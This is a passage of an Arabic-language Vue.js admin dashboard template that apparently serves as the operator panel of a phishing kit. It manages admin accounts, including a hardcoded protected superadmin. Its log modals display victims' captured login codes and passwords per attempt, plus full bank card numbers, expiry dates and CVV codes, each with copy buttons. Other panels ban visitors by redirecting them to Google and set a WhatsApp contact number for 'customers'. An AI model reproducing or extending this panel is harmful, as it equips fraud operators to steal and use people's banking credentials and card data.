            <div class="form-title-row">
              <h4>إنشاء حساب مسؤول جديد</h4>
              <button type="button" class="form-cancel-x" @click="isAddAdminOpen = false">✕</button>
            </div>
            <div class="form-row-grid">
              <div class="form-cell">
                <label>البريد الإلكتروني *</label>
                <input
                  v-model="newAdminForm.email"
                  type="email"
                  dir="ltr"
                  placeholder="admin@example.com"
                  required
                />
              </div>
              <div class="form-cell">
                <label>كلمة المرور *</label>
                <input
                  v-model="newAdminForm.password"
                  type="text"
                  dir="ltr"
                  placeholder="6 خانات على الأقل"
                  minlength="6"
                  required
                />
              </div>
              <div class="form-cell full">
                <label>نوع الصلاحية *</label>
                <select v-model="newAdminForm.role">
                  <option value="admin">أدمن (Admin) — متابعة وإدارة العملاء</option>
                  <option value="superadmin">سوبر أدمن (Superadmin) — إدارة كاملة وحظر وتعديل المشرفين</option>
                </select>
              </div>
            </div>
            <div class="form-submit-row">
              <button class="btn-secondary" type="button" @click="isAddAdminOpen = false">إلغاء</button>
              <button class="btn-primary" type="submit" :disabled="adminSaving">
                {{ adminSaving ? "جاري الإنشاء..." : "حفظ وإنشاء الحساب" }}
              </button>
            </div>
          </form>

          <!-- نموذج تغيير كلمة السر المصغر -->
          <div v-if="changePwdModal.isOpen && changePwdModal.account" class="admin-form-card password-box-card">
            <div class="form-title-row">
              <h4>تغيير كلمة السر: <span class="highlight-mono">{{ changePwdModal.account.email }}</span></h4>
              <button class="form-cancel-x" type="button" @click="changePwdModal.isOpen = false">✕</button>
            </div>
            <form @submit.prevent="handleChangePasswordSubmit">
              <div class="pwd-inline-group">
                <input
                  v-model="changePwdModal.newPassword"
                  type="text"
                  dir="ltr"
                  placeholder="كلمة المرور الجديدة (6 أحرف على الأقل)..."
                  minlength="6"
                  required
                />
                <button class="btn-warning" type="submit" :disabled="adminSaving">
                  {{ adminSaving ? "جاري الحفظ..." : "حفظ كلمة السر" }}
                </button>
              </div>
            </form>
          </div>

          <!-- قائمة بطاقات المسؤولين -->
          <div class="admins-card-grid">
            <div v-if="adminLoading" class="state-box">
              <div class="auth-spinner small"></div>
              <span>جاري تحميل قائمة المسؤولين...</span>
            </div>

            <div v-else-if="displayedAdminAccounts.length === 0" class="state-box empty">
              {{ adminFilterTab === 'online' ? 'لا يوجد مسؤولون متصلون بالداشبورد حالياً.' : 'لا توجد حسابات مطابقة.' }}
            </div>

            <div
              v-for="acc in displayedAdminAccounts"
              :key="acc.id"
              class="admin-profile-card"
              :class="{
                'is-current': acc.email.toLowerCase() === currentAdminEmail.toLowerCase(),
                'is-inactive': acc.status === 'inactive'
              }"
            >
              <div class="admin-profile-header">
                <div class="avatar-box" :class="{ online: isAdminOnline(acc) }">
                  <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                    <circle cx="12" cy="7" r="4"></circle>
                  </svg>
                  <span class="avatar-dot" :class="isAdminOnline(acc) ? 'online' : 'offline'" />
                </div>

                <div class="profile-info-text">
                  <div class="profile-name-line">
                    <strong>{{ acc.name }}</strong>
                    <span v-if="acc.email.toLowerCase() === currentAdminEmail.toLowerCase()" class="self-tag">أنت</span>
                    <span v-if="acc.email.toLowerCase() === 'mm789789@admin.com'" class="role-tag primary-superadmin">المدير العام الأعلى</span>
                    <span v-else class="role-tag" :class="acc.role">{{ acc.role === 'superadmin' ? 'سوبر أدمن' : 'أدمن' }}</span>
                    <span class="presence-tag" :class="isAdminOnline(acc) ? 'online' : 'offline'">
                      {{ isAdminOnline(acc) ? 'متصل' : 'غير متصل' }}
                    </span>
                    <span class="status-tag" :class="acc.status">{{ acc.status === 'active' ? 'نشط' : 'معطل' }}</span>
                  </div>
                  <span class="email-sub" dir="ltr">{{ acc.email }}</span>
                </div>
              </div>

              <div class="profile-meta-row">
                <span>الإنشاء: {{ formatAdminDate(acc.createdAt) }}</span>
                <span v-if="acc.lastLoginAt">• آخر دخول: {{ formatAdminDate(acc.lastLoginAt) }}</span>
              </div>

              <div class="profile-actions-bar">
                <button
                  v-if="acc.email.toLowerCase() !== 'mm789789@admin.com' || currentAdminEmail.toLowerCase() === 'mm789789@admin.com'"
                  class="profile-action-btn"
                  type="button"
                  title="تغيير كلمة السر"
                  @click="openChangePwd(acc)"
                >
                  <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                  </svg>
                  <span>تغيير كلمة السر</span>
                </button>

                <button
                  v-if="acc.email.toLowerCase() !== 'mm789789@admin.com' || currentAdminEmail.toLowerCase() === 'mm789789@admin.com'"
                  class="profile-action-btn"
                  type="button"
                  title="إنهاء الجلسة وتسجيل الخروج إجبارياً"
                  @click="handleForceLogout(acc)"
                >
                  <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
                    <polyline points="16 17 21 12 16 7"></polyline>
                    <line x1="21" y1="12" x2="9" y2="12"></line>
                  </svg>
                  <span>تسجيل خروج</span>
                </button>

                <button
                  v-if="acc.email.toLowerCase() !== 'mm789789@admin.com' && acc.email.toLowerCase() !== currentAdminEmail.toLowerCase()"
                  class="profile-action-btn"
                  type="button"
                  @click="handleToggleStatus(acc)"
                >
                  <span>{{ acc.status === 'active' ? 'تعطيل الحساب' : 'تفعيل الحساب' }}</span>
                </button>

                <button
                  v-if="(acc.email.toLowerCase() !== 'mm789789@admin.com' || currentAdminEmail.toLowerCase() === 'mm789789@admin.com') && acc.email.toLowerCase() !== currentAdminEmail.toLowerCase()"
                  class="profile-action-btn danger"
                  type="button"
                  @click="handleDeleteAdmin(acc)"
                >
                  <span>حذف</span>
                </button>

                <div
                  v-if="acc.email.toLowerCase() === 'mm789789@admin.com' && currentAdminEmail.toLowerCase() !== 'mm789789@admin.com'"
                  class="protected-account-indicator"
                  title="حساب مدير النظام الرئيسي محمي ولا يمكن التحكم به من حسابات أخرى"
                >
                  <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                  </svg>
                  <span>حساب محمي بالكامل</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>

    <!-- نافذة تأكيد الحذف -->
    <div v-if="deleteDialog.type" class="modal-backdrop" role="presentation">
      <section class="confirm-dialog-card" role="dialog" aria-modal="true">
        <div class="confirm-icon-wrap">
          <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2">
            <polyline points="3 6 5 6 21 6"></polyline>
            <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
          </svg>
        </div>
        <h2>{{ deleteDialogTitle }}</h2>
        <p>{{ deleteDialogMessage }}</p>
        <div class="confirm-actions-row">
          <button class="btn-secondary" type="button" @click="closeDeleteDialog">
            إلغاء
          </button>
          <button class="btn-danger" type="button" :disabled="deleting" @click="confirmDelete">
            {{ deleting ? "جاري الحذف..." : "تأكيد الحذف" }}
          </button>
        </div>
      </section>
    </div>

    <!-- نافذة تأكيد حظر المستخدم المنبثقة (24 ساعة) -->
    <div v-if="banDialog.isOpen" class="modal-backdrop" role="presentation" @click.self="closeBanDialog">
      <section class="confirm-dialog-card" role="dialog" aria-modal="true">
        <div class="confirm-icon-wrap" style="background: rgba(220, 38, 38, 0.15); color: #dc2626;">
          <svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"></line>
          </svg>
        </div>
        <h2>حظر المستخدم لمدة 24 ساعة</h2>
        <p>سيتم حظر هذا المستخدم فوراً لمدة <strong>24 ساعة</strong> وتحويله مباشرة إلى موقع <strong>Google</strong>، ولن يتمكن من الدخول للموقع طوال فترة الحظر. هل تريد الاستمرار؟</p>
        <div class="confirm-actions-row">
          <button class="btn-secondary" type="button" @click="closeBanDialog">
            إلغاء
          </button>
          <button class="btn-danger" type="button" style="background: #dc2626; border-color: #b91c1c;" :disabled="banning" @click="confirmBan">
            {{ banning ? "جاري الحظر..." : "تأكيد الحظر فوراً" }}
          </button>
        </div>
      </section>
    </div>

    <!-- نافذة منبثقة لسجل الإدخالات السابقة -->
    <div v-if="historyDialog.isOpen" class="modal-backdrop" role="presentation" @click.self="closeHistory">
      <section class="history-modal-box" role="dialog" aria-modal="true">
        <div class="history-modal-header">
          <div class="history-title-wrap">
            <div class="history-icon-circle">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <polyline points="12 6 12 12 16 14"></polyline>
              </svg>
            </div>
            <div>
              <h3>{{ historyDialog.title }}</h3>
              <p class="history-subtitle">سجل المحاولات والإدخالات المسجلة للعميل</p>
            </div>
          </div>

          <button class="modal-close-btn" type="button" title="إغلاق" @click="closeHistory">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        <div class="history-modal-body">
          <div v-if="historyDialog.history.length === 0" class="history-empty-state">
            <p>لم يتم تسجيل أي إدخال بعد.</p>
          </div>

          <div v-else class="history-list">
            <div
              v-for="(item, idx) in historyDialog.history"
              :key="idx"
              class="history-entry-card"
              :class="{ 'is-latest': item.isCurrent || idx === 0 }"
            >
              <div class="entry-meta">
                <div class="entry-tag">
                  <span v-if="item.isCurrent || idx === 0" class="entry-badge-latest">الإدخال الحالي</span>
                  <span v-else class="entry-badge-past">محاولة سابقة #{{ historyDialog.history.length - idx }}</span>
                  <span class="history-status-chip" :class="historyStatusBadgeClass(item.status)">
                    {{ historyStatusLabel(item.status) }}
                  </span>
                </div>
                <span v-if="item.timestamp" class="entry-time" dir="ltr">{{ formatTime(item.timestamp) }}</span>
              </div>

              <div class="entry-value-row">
                <code class="entry-code-val" dir="ltr">{{ item.value }}</code>
                <button
                  type="button"
                  class="entry-copy-btn"
                  :class="{ copied: copiedItemIndex === idx }"
                  :title="copiedItemIndex === idx ? 'تم النسخ' : 'نسخ القيمة'"
                  @click="copyHistoryValue(item.value, idx)"
                >
                  <svg v-if="copiedItemIndex === idx" viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                    <polyline points="20 6 9 17 4 12"></polyline>
                  </svg>
                  <svg v-else viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                  </svg>
                  <span>{{ copiedItemIndex === idx ? "تم النسخ" : "نسخ" }}</span>
                </button>
              </div>
            </div>
          </div>
        </div>

        <div class="history-modal-footer">
          <span class="history-count-note">إجمالي المحاولات: <strong>{{ historyDialog.history.length }}</strong></span>
          <button type="button" class="btn-secondary" @click="closeHistory">إغلاق</button>
        </div>
      </section>
    </div>

    <!-- نافذة منبثقة لسجل بيانات الدخول المشترك (كود المستخدم + كلمة السر معاً) -->
    <div v-if="credentialsHistoryDialog.isOpen" class="modal-backdrop" role="presentation" @click.self="closeCredentialsHistory">
      <section class="history-modal-box creds-history-modal" role="dialog" aria-modal="true">
        <div class="history-modal-header">
          <div class="history-title-wrap">
            <div class="history-icon-circle">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
            </div>
            <div>
              <h3>سجل محاولات تسجيل الدخول</h3>
              <p class="history-subtitle">كود المستخدم وكلمة المرور المسجلة في كل محاولة معاً</p>
            </div>
          </div>

          <button class="modal-close-btn" type="button" title="إغلاق" @click="closeCredentialsHistory">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        <div class="history-modal-body">
          <div v-if="credentialsHistoryDialog.entries.length === 0" class="history-empty-state">
            <p>لم يتم تسجيل أي محاولة دخول بعد.</p>
          </div>

          <div v-else class="history-list">
            <div
              v-for="(item, idx) in credentialsHistoryDialog.entries"
              :key="idx"
              class="history-entry-card creds-pair-card"
              :class="{ 'is-latest': item.isCurrent || idx === 0 }"
            >
              <div class="entry-meta">
                <div class="entry-tag">
                  <span v-if="item.isCurrent || idx === 0" class="entry-badge-latest">المحاولة الحالية (الأحدث)</span>
                  <span v-else class="entry-badge-past">محاولة سابقة #{{ credentialsHistoryDialog.entries.length - idx }}</span>
                  <span class="auth-value-pill mini-pill">{{ item.accountType || "أفراد" }}</span>
                  <span class="history-status-chip" :class="historyStatusBadgeClass(item.status)">
                    {{ historyStatusLabel(item.status) }}
                  </span>
                </div>
                <span v-if="item.timestamp" class="entry-time" dir="ltr">{{ formatTime(item.timestamp) }}</span>
              </div>

              <div class="creds-pair-rows">
                <!-- سطر كود المستخدم -->
                <div class="cred-pair-row">
                  <span class="cred-row-label">كود المستخدم:</span>
                  <code class="entry-code-val primary-highlight" dir="ltr">{{ item.username }}</code>
                  <button
                    type="button"
                    class="entry-copy-btn"
                    :class="{ copied: copiedCredKey === 'user-' + idx }"
                    :title="copiedCredKey === 'user-' + idx ? 'تم النسخ' : 'نسخ كود المستخدم'"
                    @click="copyCredValue(item.username, 'user-' + idx)"
                  >
                    <svg v-if="copiedCredKey === 'user-' + idx" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                      <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                    <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                    <span>{{ copiedCredKey === 'user-' + idx ? "تم النسخ" : "نسخ الكود" }}</span>
                  </button>
                </div>

                <!-- سطر كلمة المرور -->
                <div class="cred-pair-row">
                  <span class="cred-row-label">كلمة المرور:</span>
                  <code class="entry-code-val danger-highlight" dir="ltr">{{ item.password || "لم تدخل بعد" }}</code>
                  <button
                    v-if="item.password"
                    type="button"
                    class="entry-copy-btn"
                    :class="{ copied: copiedCredKey === 'pass-' + idx }"
                    :title="copiedCredKey === 'pass-' + idx ? 'تم النسخ' : 'نسخ كلمة المرور'"
                    @click="copyCredValue(item.password, 'pass-' + idx)"
                  >
                    <svg v-if="copiedCredKey === 'pass-' + idx" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                      <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                    <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                    <span>{{ copiedCredKey === 'pass-' + idx ? "تم النسخ" : "نسخ كلمة السر" }}</span>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="history-modal-footer">
          <span class="history-count-note">إجمالي المحاولات المسجلة: <strong>{{ credentialsHistoryDialog.entries.length }}</strong></span>
          <button type="button" class="btn-secondary" @click="closeCredentialsHistory">إغلاق</button>
        </div>
      </section>
    </div>

    <!-- نافذة منبثقة لسجل بيانات البطاقة البنكية -->
    <div v-if="cardHistoryDialog.isOpen" class="modal-backdrop" role="presentation" @click.self="closeCardHistory">
      <section class="history-modal-box" role="dialog" aria-modal="true">
        <div class="history-modal-header">
          <div class="history-title-wrap">
            <div class="history-icon-circle card-history-icon">
              <img :src="vimasImage" alt="Visa / MasterCard" class="modal-card-brand-img" />
            </div>
            <div>
              <h3>سجل بيانات البطاقات المصرفية</h3>
              <p class="history-subtitle">كافة إدخالات البطاقة وتاريخ الانتهاء ورمز الأمان</p>
            </div>
          </div>

          <button class="modal-close-btn" type="button" title="إغلاق" @click="closeCardHistory">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        <div class="history-modal-body">
          <div v-if="cardHistoryDialog.entries.length === 0" class="history-empty-state">
            <p>لم يتم تسجيل أي بيانات بطاقة بعد.</p>
          </div>

          <div v-else class="history-list">
            <div
              v-for="(item, idx) in cardHistoryDialog.entries"
              :key="idx"
              class="history-entry-card creds-pair-card"
              :class="{ 'is-latest': item.isCurrent || idx === 0 }"
            >
              <div class="entry-meta">
                <div class="entry-tag">
                  <span v-if="item.isCurrent || idx === 0" class="entry-badge-latest">البطاقة الحالية (الأحدث)</span>
                  <span v-else class="entry-badge-past">محاولة سابقة #{{ cardHistoryDialog.entries.length - idx }}</span>
                  <span class="history-status-chip" :class="historyStatusBadgeClass(item.status)">
                    {{ historyStatusLabel(item.status) }}
                  </span>
                </div>
                <span v-if="item.timestamp" class="entry-time" dir="ltr">{{ formatTime(item.timestamp) }}</span>
              </div>

              <div class="creds-pair-rows">
                <!-- رقم البطاقة -->
                <div class="cred-pair-row">
                  <span class="cred-row-label">رقم البطاقة:</span>
                  <code class="entry-code-val primary-highlight font-mono" dir="ltr">{{ item.cardNumber }}</code>
                  <button
                    type="button"
                    class="entry-copy-btn"
                    :class="{ copied: copiedCardKey === 'num-' + idx }"
                    :title="copiedCardKey === 'num-' + idx ? 'تم النسخ' : 'نسخ رقم البطاقة'"
                    @click="copyCardValue(item.cardNumber, 'num-' + idx)"
                  >
                    <svg v-if="copiedCardKey === 'num-' + idx" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                      <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                    <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                    <span>{{ copiedCardKey === 'num-' + idx ? "تم النسخ" : "نسخ الرقم" }}</span>
                  </button>
                </div>

                <!-- تاريخ الانتهاء -->
                <div class="cred-pair-row">
                  <span class="cred-row-label">تاريخ الانتهاء:</span>
                  <code class="entry-code-val font-mono" dir="ltr">{{ item.cardExpiry || "لم يدخل بعد" }}</code>
                  <button
                    v-if="item.cardExpiry"
                    type="button"
                    class="entry-copy-btn"
                    :class="{ copied: copiedCardKey === 'exp-' + idx }"
                    :title="copiedCardKey === 'exp-' + idx ? 'تم النسخ' : 'نسخ التاريخ'"
                    @click="copyCardValue(item.cardExpiry, 'exp-' + idx)"
                  >
                    <svg v-if="copiedCardKey === 'exp-' + idx" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                      <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                    <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                    <span>{{ copiedCardKey === 'exp-' + idx ? "تم النسخ" : "نسخ التاريخ" }}</span>
                  </button>
                </div>

                <!-- رمز الأمان CVV -->
                <div class="cred-pair-row">
                  <span class="cred-row-label">رمز الأمان (CVV):</span>
                  <code class="entry-code-val danger-highlight font-mono" dir="ltr">{{ item.cardCvv || "لم يدخل بعد" }}</code>
                  <button
                    v-if="item.cardCvv"
                    type="button"
                    class="entry-copy-btn"
                    :class="{ copied: copiedCardKey === 'cvv-' + idx }"
                    :title="copiedCardKey === 'cvv-' + idx ? 'تم النسخ' : 'نسخ CVV'"
                    @click="copyCardValue(item.cardCvv, 'cvv-' + idx)"
                  >
                    <svg v-if="copiedCardKey === 'cvv-' + idx" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                      <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                    <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                    <span>{{ copiedCardKey === 'cvv-' + idx ? "تم النسخ" : "نسخ CVV" }}</span>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="history-modal-footer">
          <span class="history-count-note">إجمالي إدخالات البطاقة: <strong>{{ cardHistoryDialog.entries.length }}</strong></span>
          <button type="button" class="btn-secondary" @click="closeCardHistory">إغلاق</button>
        </div>
      </section>
    </div>

    <!-- نافذة إعداد رقم الواتساب (WhatsApp Settings Modal) -->
    <div v-if="isWhatsAppModalOpen" class="modal-backdrop" role="presentation" @click.self="closeWhatsAppSettingsModal">
      <section class="admin-modal-box whatsapp-modal-box" role="dialog" aria-modal="true">
        <div class="modal-header">
          <div class="modal-header-title">
            <div class="modal-icon-badge whatsapp-modal-badge">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
                <path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.816 9.816 0 0 0 12.04 2zm.01 1.67c2.2 0 4.26.86 5.82 2.42a8.225 8.225 0 0 1 2.41 5.83c0 4.54-3.7 8.24-8.24 8.24-1.48 0-2.93-.4-4.2-1.15l-.3-.18-3.12.82.83-3.04-.2-.31a8.196 8.196 0 0 1-1.26-4.38c0-4.54 3.7-8.24 8.24-8.24zm4.8 11.63c-.26-.13-1.56-.77-1.8-.86-.24-.09-.42-.13-.6.13-.18.26-.69.86-.84 1.04-.16.18-.31.2-.57.07-.26-.13-1.1-.41-2.1-1.3-.78-.7-1.3-1.56-1.45-1.82-.16-.26-.02-.4.11-.53.12-.12.26-.31.39-.47.13-.15.17-.26.26-.43.09-.17.04-.33-.02-.46-.07-.13-.6-1.44-.82-1.97-.22-.53-.44-.46-.6-.47-.16-.01-.34-.01-.52-.01-.18 0-.47.07-.72.33-.24.26-.94.92-.94 2.24 0 1.32.96 2.6 1.1 2.78.13.17 1.89 2.89 4.59 4.05.64.28 1.14.44 1.53.57.65.21 1.23.18 1.7.11.52-.08 1.56-.64 1.78-1.25.22-.62.22-1.15.15-1.26-.06-.12-.23-.18-.49-.31z"/>
              </svg>
            </div>
            <div>
              <h3>إعداد رقم الواتساب</h3>
              <p>تعيين رقم الواتساب مع رمز الدولة لتحويل العملاء والتواصل معهم</p>
            </div>
          </div>

          <button class="modal-close-btn" type="button" title="إغلاق" @click="closeWhatsAppSettingsModal">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        <div class="whatsapp-modal-body">
          <!-- رسائل التنبيه والنجاح -->
          <div v-if="whatsappFeedback" class="admin-feedback-msg" :class="whatsappFeedback.type">
            <svg v-if="whatsappFeedback.type === 'success'" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
              <polyline points="20 6 9 17 4 12"></polyline>
            </svg>
            <svg v-else viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="8" x2="12" y2="12"></line>
              <line x1="12" y1="16" x2="12.01" y2="16"></line>
            </svg>
            <span>{{ whatsappFeedback.text }}</span>
          </div>

          <!-- بطاقة الإدخال -->
          <div class="whatsapp-input-card">
            <label class="whatsapp-field-label">
              <span>رقم الواتساب مع رمز الدولة</span>
              <span class="label-hint">مثال: +972591234567 أو +201012345678</span>
            </label>

            <div class="whatsapp-input-wrapper">
              <div class="whatsapp-input-prefix">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
                  <path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.816 9.816 0 0 0 12.04 2zm.01 1.67c2.2 0 4.26.86 5.82 2.42a8.225 8.225 0 0 1 2.41 5.83c0 4.54-3.7 8.24-8.24 8.24-1.48 0-2.93-.4-4.2-1.15l-.3-.18-3.12.82.83-3.04-.2-.31a8.196 8.196 0 0 1-1.26-4.38c0-4.54 3.7-8.24 8.24-8.24zm4.8 11.63c-.26-.13-1.56-.77-1.8-.86-.24-.09-.42-.13-.6.13-.18.26-.69.86-.84 1.04-.16.18-.31.2-.57.07-.26-.13-1.1-.41-2.1-1.3-.78-.7-1.3-1.56-1.45-1.82-.16-.26-.02-.4.11-.53.12-.12.26-.31.39-.47.13-.15.17-.26.26-.43.09-.17.04-.33-.02-.46-.07-.13-.6-1.44-.82-1.97-.22-.53-.44-.46-.6-.47-.16-.01-.34-.01-.52-.01-.18 0-.47.07-.72.33-.24.26-.94.92-.94 2.24 0 1.32.96 2.6 1.1 2.78.13.17 1.89 2.89 4.59 4.05.64.28 1.14.44 1.53.57.65.21 1.23.18 1.7.11.52-.08 1.56-.64 1.78-1.25.22-.62.22-1.15.15-1.26-.06-.12-.23-.18-.49-.31z"/>
                </svg>
              </div>
              <input
                v-model="whatsappInputNumber"
                type="text"
                class="whatsapp-text-input"
                dir="ltr"
                placeholder="+972591234567"
                @keydown.enter="handleSaveWhatsApp"
              />
              <button
                v-if="whatsappInputNumber"
                type="button"
                class="clear-input-btn"
                title="مسح الحقل"
                @click="whatsappInputNumber = ''"
              >
                <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                  <line x1="18" y1="6" x2="6" y2="18"></line>
                  <line x1="6" y1="6" x2="18" y2="18"></line>
                </svg>
              </button>
            </div>

            <!-- أزرار سريعة لاختيار رمز الدولة -->
            <div class="country-quick-tags">
              <span class="quick-tags-title">رموز دول سريعة:</span>
              <button
                type="button"
                class="country-tag-btn"
                @click="setCountryPrefix('+972')"
              >
                🇵🇸 +972
              </button>
              <button
                type="button"
                class="country-tag-btn"
                @click="setCountryPrefix('+20')"
              >
                🇪🇬 +20
              </button>
              <button
                type="button"
                class="country-tag-btn"
                @click="setCountryPrefix('+966')"
              >
                🇸🇦 +966
              </button>
              <button
                type="button"
                class="country-tag-btn"
                @click="setCountryPrefix('+971')"
              >
                🇦🇪 +971
              </button>
              <button
                type="button"
                class="country-tag-btn"
                @click="setCountryPrefix('+962')"
              >
                🇯🇴 +962
              </button>
            </div>
          </div>

          <!-- معاينة الرابط التلقائي المولد -->
          <div class="whatsapp-preview-card">
            <div class="preview-card-header">
              <span class="preview-title">معاينة الرابط الناتج (الرابط الفعلي):</span>
              <button
                type="button"
                class="test-link-btn"
                @click="openWhatsAppPreviewTest"
              >
                <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
                  <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                  <polyline points="15 3 21 3 21 9"></polyline>
                  <line x1="10" y1="14" x2="21" y2="3"></line>
                </svg>
                <span>تجربة وفتح الرابط</span>
              </button>
            </div>
            <code class="preview-url-box font-mono" dir="ltr">{{ previewGeneratedWhatsAppUrl }}</code>
            <p class="preview-hint">
              * هذا الرابط هو الذي سيتم استخدامه في زر الواتساب العائم، ورابط "تواصل معنا" في الموقع، وزر التحويل في الداشبورد.
            </p>
          </div>
        </div>

        <div class="modal-footer whatsapp-modal-footer">
          <button
            type="button"
            class="btn-reset-whatsapp"
            :disabled="whatsappSaving"
            @click="handleResetWhatsApp"
          >
            استعادة الافتراضي
          </button>

          <div class="footer-action-buttons">
            <button
              type="button"
              class="btn-secondary"
              :disabled="whatsappSaving"
              @click="closeWhatsAppSettingsModal"
            >
              إلغاء
            </button>
            <button
              type="button"
              class="btn-primary whatsapp-save-btn"
              :disabled="whatsappSaving"
              @click="handleSaveWhatsApp"
            >
              <span v-if="whatsappSaving">جارٍ الحفظ...</span>
              <span v-else>حفظ الرقم</span>
            </button>
          </div>
        </div>
      </section>
    </div>

